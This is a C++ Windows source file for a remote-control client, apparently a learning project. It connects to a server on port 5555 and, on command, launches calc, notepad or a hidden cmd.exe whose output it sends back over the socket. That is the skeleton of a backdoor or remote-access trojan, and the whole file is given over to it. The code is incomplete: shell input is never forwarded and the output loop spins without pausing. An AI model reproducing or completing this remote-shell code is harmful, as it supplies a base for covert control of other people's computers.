#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <WinSock2.h>

#pragma comment(lib,"ws2_32.lib")

SOCKET clientsocket;

typedef struct HEAD_HEAD {
	int commend;
	int len;
}HEAD_INFO;

enum allprotol {
	OPEN_CALC,
	OPEN_NOT,
	OPEN_CMD,
	ON_CMDDATA,
	ON_CMDCOMMAND
};

void judge(HEAD_INFO _head);
void matchOpenCmd();
HANDLE m_hreadzi, m_hwritezi;
HANDLE m_hreadfu, m_hwritefu;

static DWORD WINAPI cmdwork(LPVOID lparam);

void judge(HEAD_INFO _head)
{
	if (_head.commend == OPEN_CALC) {
		system("calc");
	}
	if (_head.commend == OPEN_NOT)
	{
		system("notepad");
	}

	if (_head.commend == OPEN_CMD)
	{
		matchOpenCmd();
	}
}

void matchOpenCmd()
{
	BOOL ret = false;
	SECURITY_ATTRIBUTES as = { 0 };
	as.nLength = sizeof(as);
	as.bInheritHandle = TRUE;
	as.lpSecurityDescriptor = NULL;
	ret = CreatePipe(&m_hreadfu,&m_hwritezi,&as,0);
	if (ret == false)
	{
		printf("创建第一个管道失败\n");
		return;
	}
	ret = CreatePipe(&m_hreadzi,&m_hwritefu,&as,0);

	if (ret == false)
	{
		printf("创建第二个管道失败\n");
		return;
	}
	_PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = m_hreadzi;
	si.hStdOutput = si.hStdError = m_hwritezi;
	ret = CreateProcess(NULL,(LPSTR)"cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	HANDLE thread = CreateThread(NULL,0,cmdwork,NULL,0,NULL);
	CloseHandle(thread);
}

DWORD __stdcall cmdwork(LPVOID lparam)
{
	bool fag = true;
	while (fag)
	{
		DWORD dw = 0;
		bool ret = PeekNamedPipe(m_hreadfu,NULL,0,NULL,&dw,NULL);
		if (dw > 0)
		{
			char* buff = new char[dw + 1];
			memset(buff, 0, dw + 1);
			ReadFile(m_hreadfu,buff,dw,&dw,NULL);
			HEAD_INFO head;
			head.commend = ON_CMDCOMMAND;
			head.len = dw + 1;
			send(clientsocket,(char*)&head,sizeof(head),0);
			send(clientsocket, buff, dw + 1, 0);
			delete[] buff;
;		}
	}
	return 0;
}

int main() {

	WSADATA wsa;
	int ret = WSAStartup(MAKEWORD(2,2),&wsa);
	if (ret != 0)
	{
		printf("加载套接字版本库失败\n");
	}

	//init ip and port 

	SOCKADDR_IN addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(5555);
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");


	clientsocket = socket(AF_INET,SOCK_STREAM,0);

	if (connect(clientsocket, (struct sockaddr*)&addr, sizeof(addr)) == INVALID_SOCKET)
	{
		printf("服务器连接失败\n");
	}


	while (true) {
		HEAD_INFO head;
		recv(clientsocket,(char*)&head,sizeof(head),0);
		judge(head);
	}
	return 0;
}